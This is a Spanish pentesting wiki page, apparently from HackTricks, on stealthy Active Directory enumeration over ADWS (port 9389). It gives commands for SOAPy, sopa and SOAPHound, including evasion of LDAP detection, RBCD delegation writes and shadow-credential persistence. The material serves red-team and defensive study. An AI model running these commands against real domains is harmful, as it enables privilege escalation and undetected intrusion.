# Enumeración y recopilación sigilosa de Active Directory Web Services (ADWS)

{{#include ../../banners/hacktricks-training.md}}

## ¿Qué es ADWS?

Active Directory Web Services (ADWS) está **habilitado de forma predeterminada en todos los controladores de dominio desde Windows Server 2008 R2** y escucha en TCP **9389**. A pesar del nombre, **no interviene HTTP**. En su lugar, el servicio expone datos de tipo LDAP mediante una pila de protocolos de framing .NET propietarios:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Como el tráfico se encapsula en estos frames SOAP binarios y viaja por un puerto poco habitual, **es mucho menos probable que la enumeración mediante ADWS sea inspeccionada, filtrada o detectada por firmas que el tráfico LDAP clásico por los puertos 389 y 636**. Para los operadores, esto significa:<sup>[[1]](#references)[[7]](#references)</sup>

* Recon más sigiloso: los equipos Blue Team suelen centrarse en las consultas LDAP.
* Libertad para recopilar datos desde **hosts que no sean Windows (Linux, macOS)** mediante un túnel de 9389/TCP a través de un proxy SOCKS.
* Los mismos datos que obtendrías mediante LDAP (usuarios, grupos, ACL, esquema, etc.) y la capacidad de realizar **escrituras** (p. ej., `msDs-AllowedToActOnBehalfOfOtherIdentity` para **RBCD**).

Las interacciones con ADWS se implementan mediante WS-Enumeration: cada consulta comienza con un mensaje `Enumerate` que define el filtro/los atributos LDAP y devuelve un GUID `EnumerationContext`, seguido de uno o más mensajes `Pull` que transmiten resultados hasta el límite definido por el servidor.<sup>[[7]](#references)</sup> Los contextos caducan tras unos 30 minutos, así que las herramientas deben paginar los resultados o dividir los filtros (consultas por prefijo para cada CN) para evitar perder el estado.<sup>[[8]](#references)</sup> Al solicitar descriptores de seguridad, especifica el control `LDAP_SERVER_SD_FLAGS_OID` para omitir las SACL; de lo contrario, ADWS simplemente elimina el atributo `nTSecurityDescriptor` de su respuesta SOAP.

> NOTA: ADWS también lo utilizan muchas herramientas GUI/PowerShell de RSAT, por lo que el tráfico puede confundirse con actividad administrativa legítima.

## SoaPy: cliente nativo de Python

[SoaPy](https://github.com/logangoins/soapy) es una **reimplementación completa de la pila de protocolos ADWS en Python puro**. Construye los frames NBFX/NBFSE/NNS/NMF byte por byte, lo que permite recopilar datos desde sistemas tipo Unix sin recurrir al runtime de .NET.<sup>[[1]](#references)[[2]](#references)</sup>

### Funciones principales

* Admite **el uso de proxies SOCKS** (útil desde implantes C2).
* Filtros de búsqueda detallados, idénticos a los de LDAP, como `-q '(objectClass=user)'`.
* Operaciones de **escritura** específicas para RBCD, SPN, flags de cuenta y credenciales de clave.<sup>[[2]](#references)</sup>
* La salida de SOAPy se puede analizar con **BOFHound** e importar a BloodHound.<sup>[[2]](#references)[[3]](#references)</sup>
* Flag `--parse` para dar formato legible a las marcas de tiempo y a `userAccountControl` cuando se necesita que sean fáciles de leer.<sup>[[2]](#references)</sup>

### Flags de recopilación específica y operaciones de escritura

SoaPy incluye opciones seleccionadas que replican las tareas de búsqueda LDAP más habituales mediante ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, además de las opciones `--query` / `--filter` sin procesar para consultas personalizadas. Combínalas con primitivas de escritura como `--rbcd <source>` (establece `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (preparación de SPN para Kerberoasting dirigido) y `--asrep` (activa `DONT_REQ_PREAUTH` en `userAccountControl`).<sup>[[2]](#references)</sup>

Ejemplo de búsqueda específica de SPN que solo devuelve `samAccountName` y `servicePrincipalName`:

```bash
SOAPy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Usa el mismo host/las mismas credenciales para weaponizar de inmediato los hallazgos: vuelca los objetos que ya están configurados para RBCD con `--rbcds` y luego ejecuta `--rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'` para preparar una cadena de Resource-Based Constrained Delegation (consulta [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) para conocer la ruta completa de abuso).<sup>[[2]](#references)</sup>

### Instalación (host del operador)

Instala la versión actual de SOAPy CLI desde su repositorio upstream; el nombre del ejecutable distingue entre mayúsculas y minúsculas en sistemas tipo Unix.<sup>[[2]](#references)[[9]](#references)</sup>

```bash
pipx install git+https://github.com/logangoins/SOAPy
```

### Recopilación solo con tickets a través de un pivote SOCKS

Si un punto de apoyo proporciona un ticket Kerberos, pero no una contraseña en texto claro, convierte un ticket `.kirbi` a `ccache`, tal como se describe en [Pass the Ticket](pass-the-ticket.md), y luego indica a SOAPy que use esa caché. Se puede usar un ticket para el servicio LDAP del DC en el flujo de trabajo ADWS de SOAPy documentado; enruta tanto el tráfico ADWS como el de Kerberos a través del pivote.<sup>[[9]](#references)</sup>

```bash
KRB5CCNAME=ticket.ccache proxychains4 SOAPy -k \
  corp.local/alice@dc01.corp.local -q '(objectClass=computer)'
```

### Shadow credentials over ADWS

Si el principal actual puede escribir en `msDS-KeyCredentialLink` de un objeto objetivo, SOAPy puede agregar una credencial de clave a través de ADWS y exportar el PFX correspondiente. Registra el DeviceID devuelto para eliminarlo de forma precisa en lugar de borrar todo el atributo. Usa el PFX para PKINIT, como se explica en [Shadow Credentials](acl-persistence-abuse/shadow-credentials.md).<sup>[[10]](#references)</sup>

```bash
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds add --shadow-target targetuser
# After use, remove only the DeviceID returned by the add action:
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds remove --shadow-target targetuser --device-id '<DEVICE_ID>'
```

## ADWSDomainDump – LDAPDomainDump sobre ADWS (Linux/Windows)

* Fork de `ldapdomaindump` que sustituye las consultas LDAP por llamadas ADWS a través de TCP/9389 para reducir las detecciones de firmas LDAP.
* Realiza una comprobación inicial de conectividad al puerto 9389, a menos que se pase `--force` (omite el sondeo si los escaneos de puertos generan mucho ruido o están filtrados).
* Probado con Microsoft Defender for Endpoint y CrowdStrike Falcon; en el README se indica que el bypass se realizó correctamente.<sup>[[4]](#references)</sup>

### Instalación

```bash
pipx install .
```

### Uso

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

La salida típica registra la comprobación de accesibilidad del puerto 9389, el bind de ADWS y el inicio y la finalización del dump:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Un cliente práctico para ADWS en Golang

Al igual que soapy, [sopa](https://github.com/Macmod/sopa) implementa la pila del protocolo ADWS (MS-NNS + MC-NMF + SOAP) en Golang y expone flags de línea de comandos para realizar llamadas ADWS como estas:<sup>[[5]](#references)</sup>

* **Búsqueda y recuperación de objetos** - `query` / `get`
* **Ciclo de vida de objetos** - `create [user|computer|group|ou|container|custom]` y `delete`
* **Edición de atributos** - `attr [add|replace|delete]`
* **Administración de cuentas** - `set-password` / `change-password`
* y otros como `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

### Aspectos destacados de la correspondencia entre protocolos

* Las búsquedas al estilo LDAP se realizan mediante **WS-Enumeration** (`Enumerate` + `Pull`), con proyección de atributos, control del ámbito (Base/OneLevel/Subtree) y paginación.
* La obtención de un único objeto usa **WS-Transfer** `Get`; los cambios de atributos usan `Put`; las eliminaciones usan `Delete`.
* La creación de objetos integrada usa **WS-Transfer ResourceFactory**; los objetos personalizados usan una **IMDA AddRequest** basada en plantillas YAML.
* Las operaciones de contraseña son acciones **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Descubrimiento de metadatos sin autenticación (mex)

ADWS expone WS-MetadataExchange sin credenciales, lo que permite validar rápidamente la exposición antes de autenticarse:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### Notas sobre el descubrimiento de DNS/DC y la selección de objetivos Kerberos

Sopa puede resolver los DC mediante SRV si se omite `--dc` y se proporciona `--domain`. Consulta en este orden y usa el objetivo con mayor prioridad:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

Operativamente, es preferible usar un resolver controlado por un DC para evitar fallos en entornos segmentados:

* Usa `--dns <DC-IP>` para que **todas** las búsquedas SRV/PTR/directas pasen por el DNS del DC.
* Usa `--dns-tcp` cuando UDP esté bloqueado o las respuestas SRV sean grandes.
* Si `--dc` es una IP, sopa siempre realiza una búsqueda **PTR inversa**: el filtro de dirección `wsa:To` de ADWS requiere un FQDN incluso sin Kerberos. Si falta la zona inversa, proporciona directamente el FQDN del DC.<sup>[[5]](#references)</sup>

Ejemplo (IP + Kerberos, DNS forzado a través del DC):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Opciones de material de autenticación

Además de las contraseñas en texto plano, sopa admite **hashes NT**, **claves AES de Kerberos**, **ccache** y **certificados PKINIT** (PFX o PEM) para la autenticación de ADWS. Kerberos se usa implícitamente al utilizar `--aes-key`, `-c` (ccache) u opciones basadas en certificados.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Creación de objetos personalizados mediante plantillas

Para clases de objeto arbitrarias, el comando `create custom` consume una plantilla YAML que se asigna a una `AddRequest` de IMDA:<sup>[[5]](#references)</sup>

* `parentDN` y `rdn` definen el contenedor y el DN relativo.
* `attributes[].name` admite `cn` o `addata:cn` con espacio de nombres.
* `attributes[].type` acepta `string|int|bool|base64|hex` o `xsd:*` explícito.
* **No** incluyas `ad:relativeDistinguishedName` ni `ad:container-hierarchy-parent`; sopa los inyecta.
* Los valores `hex` se convierten a `xsd:base64Binary`; usa `value: ""` para establecer cadenas vacías.

## SOAPHound – Recopilación ADWS de gran volumen (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) es un recolector .NET que mantiene todas las interacciones LDAP dentro de ADWS y genera JSON compatible con BloodHound v4. Primero crea una caché completa de `objectSid`, `objectGUID`, `distinguishedName` y `objectClass` (`--buildcache`), y luego la reutiliza para ejecuciones de gran volumen de `--bhdump`, `--certdump` (ADCS) o `--dnsdump` (DNS integrado en AD), de modo que solo ~35 atributos críticos salen del DC. AutoSplit (`--autosplit --threshold <N>`) divide automáticamente las consultas por prefijo CN para mantenerse por debajo del tiempo de espera de 30 minutos de EnumerationContext en bosques grandes.<sup>[[8]](#references)</sup>

Flujo de trabajo habitual en una VM de operador unida al dominio:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump --autosplit --threshold 1200 --nolaps -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Los JSON exportados se integran directamente en los flujos de trabajo de SharpHound/BloodHound; consulta [BloodHound methodology](bloodhound.md) para ver ideas de análisis de grafos posteriores. AutoSplit hace que SOAPHound sea resiliente en bosques con millones de objetos y, al mismo tiempo, mantiene un número de consultas menor que el de las instantáneas de estilo ADExplorer.

## Flujo de trabajo de recopilación sigilosa de AD

El siguiente flujo de trabajo muestra cómo enumerar **objetos de dominio y ADCS** mediante ADWS, convertirlos a JSON de BloodHound y buscar rutas de ataque basadas en certificados, todo desde Linux:

1. **Tuneliza 9389/TCP** desde la red objetivo hasta tu equipo (por ejemplo, mediante Chisel, Meterpreter, reenvío dinámico de puertos SSH, etc.). Enruta el cliente TCP sin procesar a través de SOCKS con `proxychains4 SOAPy ...` (configura la dirección SOCKS5 en `proxychains4.conf`); `HTTPS_PROXY` no enruta este protocolo no HTTP.<sup>[[9]](#references)</sup>

2. **Recopila el objeto del dominio raíz:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Recopila objetos relacionados con ADCS del NC de configuración:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority)(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **Convertir a BloodHound:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **Carga el ZIP** en la GUI de BloodHound y ejecuta consultas cypher como `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` para revelar rutas de escalada de certificados (ESC1, ESC8, etc.).

### Escritura de `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)

Con acceso de escritura al objeto de equipo de destino, usa la acción RBCD de SOAPy en lugar de una cadena de descriptor de seguridad sin procesar. Aquí, `WEBSRV01$` es el origen controlado y `FILE01$` es el destino cuyo atributo se modifica.<sup>[[2]](#references)</sup>

```bash
SOAPy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'
```

Continúa la cadena Kerberos S4U en [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md).

## Resumen de herramientas

| Propósito | Herramienta | Notas |
|---------|------|-------|
| Enumeración de ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, lectura/escritura |
| Volcado de ADWS de gran volumen | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, primero caché, modos BH/ADCS/DNS |
| Ingesta en BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Convierte registros de SoaPy/ldapsearch |
| Compromiso de certificados | [Certipy](https://github.com/ly4k/Certipy) | Se puede enrutar mediante el mismo SOCKS |
| Enumeración de ADWS y cambios en objetos | [sopa](https://github.com/Macmod/sopa) | Cliente genérico para interactuar con endpoints de ADWS conocidos; permite enumerar, crear objetos, modificar atributos y cambiar contraseñas |



## References

- [1] [SpecterOps – Asegúrate de usar SOAP(y): guía de operadores para recopilar datos de AD de forma sigilosa mediante ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy en GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound en GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump en GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa en GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – Especificaciones MC-NBFX, MC-NBFSE, MS-NNS y MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Enumeración sigilosa de entornos de Active Directory mediante ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – Herramienta SOAPHound para recopilar datos de Active Directory mediante ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
- [9] [Wiki de SOAPy – Recon](https://github.com/logangoins/SOAPy/wiki/Recon)
- [10] [Wiki de SOAPy – Post-Exploitation](https://github.com/logangoins/SOAPy/wiki/Post%E2%80%90Exploitation)
{{#include ../../banners/hacktricks-training.md}}
